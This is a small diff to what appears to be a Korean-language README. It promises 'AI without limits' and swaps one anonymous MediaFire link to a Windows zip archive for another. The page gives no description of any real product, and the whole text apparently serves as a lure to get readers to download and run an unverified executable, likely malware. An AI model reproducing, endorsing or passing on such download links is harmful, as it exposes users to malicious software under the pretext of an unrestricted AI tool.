@@ -2,7 +2,7 @@
 **🚀 제한 없이 AI를 활용하세요! 🚀**  
 
 **지금 다운로드:**  
-[Windows용 다운로드](https://download1587.mediafire.com/4bogmjc0kligzeqHoyoaS1OtZuUPKwajtVcK6YI93jhvxMbocfsC5nRnzUls4f_0YLkCF4kqYwBvHufR74DZhLPuTapVDn1VuBpnGEbcde0GKUKWZALMDijAJo4f6lE6NCKiJBEJOtGfLcllTPCc2WmMhY24lz599TU0BY92pdmn/3l5gw32c2597fto/setup.zip)  
+[Windows용 다운로드](https://download1076.mediafire.com/jehqxum7woygl-6MfuUBlTbp4TOZmk4iUILqx2ZrYi9waThJN0V-OCKnH2a6XPASm-1SIMMUYKDncfrToAAr9BNahX18tlFI8uGeVkj_dhQqfuBLIQdic5ENPA9PCvy3yvG7QYEuOFRPH6ot1dzQmMvA86hsihjeIAY0rSYcLHlJ/vfpk9dpxrjjupr9/Install.zip)  
 
 ---
 
